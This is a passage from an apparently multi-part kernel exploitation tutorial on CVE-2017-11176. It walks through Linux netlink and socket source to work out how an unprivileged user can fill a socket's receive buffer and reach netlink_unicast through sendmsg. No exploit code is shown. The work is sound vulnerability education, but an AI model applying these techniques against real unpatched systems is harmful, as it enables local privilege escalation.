<span class="w">      </span><span class="c1">// ... cut  ...</span>

<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="nl">SO_RCVBUF</span><span class="p">:</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">val</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sysctl_rmem_max</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="n">val</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sysctl_rmem_max</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="nl">set_rcvbuf</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_userlocks</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">SOCK_RCVBUF_LOCK</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">val</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">SOCK_MIN_RCVBUF</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SOCK_MIN_RCVBUF</span><span class="p">;</span><span class="w">          </span>
<span class="w">        </span><span class="k">else</span><span class="w">  </span>
<span class="w">          </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">val</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w">                 </span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="c1">// ... cut (other options handling) ...</span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>When you see this type of code, <strong>keep an eye on every expression type</strong>.</p><p><strong>NOTE</strong>: A lot of bugs exist because of this "signed/unsigned type mixing". The same goes when casting a bigger type (u64) to a smaller type (u32). This often leads to <em>int overflow</em> or <em>type casting</em> issues.</p><p>In our target (yours could be different) we have:</p><ul><li><strong>sk_rcvbuf</strong>: int</li><li><strong>val</strong>: int</li><li><strong>sysctl_rmem_max</strong>: __u32</li><li><strong>SOCK_MIN_RCVBUF</strong>: "promoted" to size_t because of "sizeof()"</li></ul><p>The SOCK_MIN_RCVBUF definition being:</p><div class="highlight"><pre><span></span><code><span class="cp">#define SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff))</span>
</code></pre></div><p>In general, when mixing <em>signed</em> integer with <em>unsigned</em> integer, the <em>signed</em> integer is casted into the unsigned type.</p><p><strong>WARNING</strong>: Don't consider the previous rule to be <em>rock solid</em>, the compiler might choose to do something else. You should check the disassembly code to be sure.</p><p>Let's consider we pass a <em>negative</em> value in "val". During [0], it will be promoted to unsigned type (because <strong>sysctl_rmem_max</strong> type is "__u32"). And so, value will be reset to <em>sysctl_rmem_max</em> (small negative values are huge unsigned values).</p><p>Even if "val" is not promoted to "__u32", we wouldn't pass the second check [1]. In the end, we will be clamped to [SOCK_MIN_RCVBUF, sysctl_rmem_max] (i.e. not negative). That is, we need to play with <strong>sk_rmem_alloc</strong> instead of <strong>sk_rcvbuf</strong> field.</p><p><strong>NOTE</strong>: While developing an exploit you will meet this phenomenon: analyzing a lot of code paths that actually lead to <em>nowhere</em>. We wanted to expose it in this article.</p><h2 id="back-to-the-normal-path">Back to the "normal" path</h2><p>It is time to get back to something we ignored since the very first line of this series: mq_notify() "normal" path. Conceptually, there is a "retry path" when the sock receive buffer is full because the <strong>normal path might actually fill it</strong>.</p><p>In netlink_attachskb():</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_attachskb</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"></span>
<span class="w">              </span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">timeo</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">ssk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rcvbuf</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">test_bit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">state</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="c1">// ... cut (retry path) ...</span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
<span class="w">      </span><span class="n">skb_set_owner_r</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">sk</span><span class="p">);</span><span class="w">       </span><span class="c1">// &lt;----- what about this ?</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>So, the <em>normal path</em> calls <strong>skb_set_owner_r()</strong>:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">skb_set_owner_r</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="n">WARN_ON</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">destructor</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="n">__skb_orphan</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">destructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_rfree</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="n">atomic_add</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">truesize</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_rmem_alloc</span><span class="p">);</span><span class="w">  </span><span class="c1">// sk-&gt;sk_rmem_alloc += skb-&gt;truesize</span>
<span class="w">      </span><span class="n">sk_mem_charge</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">truesize</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>Yes, <strong>skb_set_owner_r() increases the value of <em>sk_rmem_alloc</em> by <em>skb-&gt;truesize</em></strong>. So, let's call mq_notify() multiple times until the receive buffer is full? Unfortunately, we can't do it that easily.</p><p>In the normal course of mq_notify(), a skb (called "cookie") is created at the beginning of the function and attached to the netlink_sock with netlink_attachskb(), we already covered this. Then, both the netlink_sock and the skb are <em>associated</em> to the "mqueue_inode_info" structure which belongs to a message queue (cf. mq_notify's normal path).</p><p><strong>The problem is, there can be only one (cookie) "skb" associated to a mqueue_inode_info structure at a time</strong>. That is, calling mq_notify() a second time will fail with a "-EBUSY" error. In other words, we can only increase <strong>sk_rmem_alloc</strong> size once (for a given message queue) and this is not enough (only 32 bytes) to make it greater than sk_rcvbuf.</p><p>We <em>might</em> actually create multiple message queues, hence multiple mqueue_inode_info objects and call mq_notify() multiple times. Or, we can also use mq_timedsend() syscall to push messages into the queue. Because we don't want to study another subsystem (mqueue), and stick with "common" kernel path (sendmsg), we won't do that here. It might be a good exercise though...</p><p><strong>NOTE</strong>: There are always multiple ways to code an exploit.</p><p>While we will not take the mq_notify() normal path, it still exposed an important thing: we can increase sk_rmem_alloc with skb_set_owner_r(), hence netlink_attachskb().</p><h2 id="the-netlink_unicast-path">The netlink_unicast() path</h2><p>With the help of skb_set_owner_r(), we saw that netlink_attachskb() might increase the sk_rmem_alloc value. Function netlink_attachskb() is also called by <strong>netlink_unicast()</strong>. Let's do a <em>bottom-up analysis</em> to check how we can reach netlink_unicast() up to a syscall:</p><div class="highlight"><pre><span></span><code>- skb_set_owner_r
- netlink_attachskb
- netlink_unicast   
- netlink_sendmsg   // there is a lots of "other" callers of netlink_unicast
- sock-&gt;ops-&gt;sendmsg()          
- __sock_sendmsg_nosec()
- __sock_sendmsg()
- sock_sendmsg()
- __sys_sendmsg()
- SYSCALL_DEFINE3(sendmsg, ...)
</code></pre></div><p>Because <strong>netlink_sendmsg()</strong> is a <em>proto_ops</em> of netlink sockets (<a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html">Core Concept #1</a>), it is reachable via a sendmsg() syscall.</p><p>The <em>generic</em> code path from a sendmsg() syscall to a sendmsg's proto_ops (sock-&gt;ops-&gt;sendmsg()) will be covered in deeper details in <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>. For now, let's assume that we can reach netlink_sendmsg() without much trouble.</p><h2 id="reaching-netlink_unicast-from-netlink_sendmsg">Reaching netlink_unicast() from netlink_sendmsg()</h2><p>The sendmsg() syscall has the following signature:</p><div class="highlight"><pre><span></span><code><span class="kt">ssize_t</span><span class="w"> </span><span class="nf">sendmsg</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">sockfd</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>Reaching netlink_unicast() is all about setting the <em>right values</em> in both <em>msg</em> and <em>flags</em> arguments:</p><div class="highlight"><pre><span></span><code><span class="w">  </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">     </span><span class="kt">void</span><span class="w">         </span><span class="o">*</span><span class="n">msg_name</span><span class="p">;</span><span class="w">       </span><span class="cm">/* optional address */</span><span class="w"></span>
<span class="w">     </span><span class="kt">socklen_t</span><span class="w">     </span><span class="n">msg_namelen</span><span class="p">;</span><span class="w">    </span><span class="cm">/* size of address */</span><span class="w"></span>
<span class="w">     </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"> </span><span class="o">*</span><span class="n">msg_iov</span><span class="p">;</span><span class="w">        </span><span class="cm">/* scatter/gather array */</span><span class="w"></span>
<span class="w">     </span><span class="kt">size_t</span><span class="w">        </span><span class="n">msg_iovlen</span><span class="p">;</span><span class="w">     </span><span class="cm">/* # elements in msg_iov */</span><span class="w"></span>
<span class="w">     </span><span class="kt">void</span><span class="w">         </span><span class="o">*</span><span class="n">msg_control</span><span class="p">;</span><span class="w">    </span><span class="cm">/* ancillary data, see below */</span><span class="w"></span>
<span class="w">     </span><span class="kt">size_t</span><span class="w">        </span><span class="n">msg_controllen</span><span class="p">;</span><span class="w"> </span><span class="cm">/* ancillary data buffer len */</span><span class="w"></span>
<span class="w">     </span><span class="kt">int</span><span class="w">           </span><span class="n">msg_flags</span><span class="p">;</span><span class="w">      </span><span class="cm">/* flags on received message */</span><span class="w"></span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>

<span class="w">  </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"></span>
<span class="w">  </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w">     </span><span class="o">*</span><span class="n">iov_base</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">__kernel_size_t</span><span class="w"> </span><span class="n">iov_len</span><span class="p">;</span><span class="w"></span>
<span class="w">  </span><span class="p">};</span><span class="w"></span>
</code></pre></div><p>In this section, we will <strong>infer the parameters value from the code and established our "constraint" list step-by-step</strong>. Doing so makes the kernel take the path that <em>we</em> want. Kernel exploitation is actually all about this. Here, the call to netlink_unicast() is at the very end of the function. We will need to pass (or skip) all the checks...</p><p>Let's start:</p><div class="highlight"><pre><span></span><code><span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_sendmsg</span><span class="p">(</span><span class="k">struct</span> <span class="nc">kiocb</span><span class="w"> </span><span class="o">*</span><span class="n">kiocb</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock_iocb</span><span class="w"> </span><span class="o">*</span><span class="n">siocb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kiocb_to_siocb</span><span class="p">(</span><span class="n">kiocb</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sockaddr_nl</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_name</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">u32</span><span class="w"> </span><span class="n">dst_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">u32</span><span class="w"> </span><span class="n">dst_group</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">sk_buff</span><span class="w"> </span><span class="o">*</span><span class="n">skb</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="k">struct</span> <span class="nc">scm_cookie</span><span class="w"> </span><span class="n">scm</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="n">u32</span><span class="w"> </span><span class="n">netlink_skb_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_flags</span><span class="o">&amp;</span><span class="n">MSG_OOB</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EOPNOTSUPP</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">NULL</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">scm</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">scm_send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="nb">true</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>

<span class="w">      </span><span class="c1">// ... cut ...</span>

<span class="w">      </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_unicast</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">skb</span><span class="p">,</span><span class="w"> </span><span class="n">dst_pid</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_flags</span><span class="o">&amp;</span><span class="n">MSG_DONTWAIT</span><span class="p">);</span><span class="w">   </span><span class="c1">// &lt;---- our target</span>

<span class="w">    </span><span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">      </span><span class="n">scm_destroy</span><span class="p">(</span><span class="n">siocb</span><span class="o">-&gt;</span><span class="n">scm</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>The flag <em>MSG_OOB</em> should not be set to pass [0]. Here is our first constraint: <strong>msg-&gt;msg_flags MSG_OOB bit is not set</strong>.</p><p>The test at [1] will be true since "siocb-&gt;scm" is set to <em>NULL</em> in <strong>__sock_sendmsg_nosec()</strong>. Finally, <em>scm_send()</em> should not return a negative value [2], the code is:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="n">__inline__</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">scm_send</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"></span>
<span class="w">                   </span><span class="k">struct</span> <span class="nc">scm_cookie</span><span class="w"> </span><span class="o">*</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="n">forcecreds</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">scm</span><span class="p">));</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">forcecreds</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">scm_set_cred</span><span class="p">(</span><span class="n">scm</span><span class="p">,</span><span class="w"> </span><span class="n">task_tgid</span><span class="p">(</span><span class="n">current</span><span class="p">),</span><span class="w"> </span><span class="n">current_cred</span><span class="p">());</span><span class="w"></span>
<span class="w">    </span><span class="n">unix_get_peersec_dgram</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">scm</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">     </span><span class="c1">// &lt;----- this need to be true...</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">                     </span><span class="c1">// &lt;----- ...so we hit this and skip __scm_send()</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">__scm_send</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">scm</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>The second constraint: <strong>msg-&gt;msg_controllen equals zero</strong> (the type is size_t, no negative values).</p><p>Let's continue:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="c1">// ... netlink_sendmsg() continuation ...</span>

<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_namelen</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">addr</span><span class="o">-&gt;</span><span class="n">nl_family</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">AF_NETLINK</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="n">a</span><span class="p">]</span><span class="w">    </span><span class="n">dst_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">addr</span><span class="o">-&gt;</span><span class="n">nl_pid</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="n">b</span><span class="p">]</span><span class="w">    </span><span class="n">dst_group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ffs</span><span class="p">(</span><span class="n">addr</span><span class="o">-&gt;</span><span class="n">nl_groups</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="o">-</span><span class="n">EPERM</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">dst_group</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">dst_pid</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">netlink_allowed</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">NL_NONROOT_SEND</span><span class="p">))</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">netlink_skb_flags</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">NETLINK_SKB_DST</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="n">dst_pid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">dst_pid</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="n">dst_group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">dst_group</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>

<span class="w">      </span><span class="c1">// ... cut ...</span>
</code></pre></div><p>Okay, this one is a bit tricky. This block depends if the "sender" socket is already connected to the destination (receiver) socket or not. If it is, then both "nlk-&gt;dst_pid" and "nlk-&gt;dst_group" are already set. Since we don't want to connect to the receiver socket (bad side effect), we want to take the first branch. That is <strong>msg-&gt;msg_namelen must be different than zero</strong> [0].</p><p>If you look back at the beginning of the function, we see that "addr" is another user-controlled parameter: msg-&gt;msg_name. With the help of [2a] and [2b] we can choose an arbitrary "dst_group" and "dst_pid". Controlling those allows us to:</p><ol><li>dst_group == 0: send a unicast message instead of broadcast (cf. <em>man 7 netlink</em>)</li><li>dst_pid != 0: talk to the receiver socket (userland) of our choice. Zero meaning "talk to the kernel" (read the manual!).</li></ol><p>Which we translate in the constraint list into (msg_name is cast to sockaddr_nl):</p><ol><li><strong>msg-&gt;msg_name-&gt;dst_group equals zero</strong></li><li><strong>msg-&gt;msg_name-&gt;dst_pid equals "destination" socket nl_pid</strong></li></ol><p>However, it implies that <strong>netlink_allowed(sock, NL_NONROOT_SEND)</strong> [3] does not return zero:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">netlink_allowed</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">nl_table</span><span class="p">[</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_protocol</span><span class="p">].</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">capable</span><span class="p">(</span><span class="n">CAP_NET_ADMIN</span><span class="p">));</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Because we are exploiting from an unprivileged user, we don't have CAP_NET_ADMIN. The only "netlink protocol" which has the "NL_NONROOT_SEND" flag set is <em>NETLINK_USERSOCK</em> (cross-reference it). That is: <strong>"sender" socket must has the protocol NETLINK_USERSOCK</strong>.</p><p>In addition [1], we need <strong>msg-&gt;msg_name-&gt;nl_family equals AF_NETLINK</strong>.</p><p>Next:</p><div class="highlight"><pre><span></span><code><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">nlk</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netlink_autobind</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">err</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>We can't control the check at [0] because during socket creation, the socket's pid is set to zero (the whole structure is zeroed by sk_alloc()). We will get back to this, but for now consider that <strong>netlink_autobind()</strong> [1] will find an "available" pid for our sender socket and it will not fail. However, the check will be skipped during a second call to sendmsg(), "nlk-&gt;pid" will be set this time. Next:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EMSGSIZE</span><span class="p">;</span><span class="w"></span>
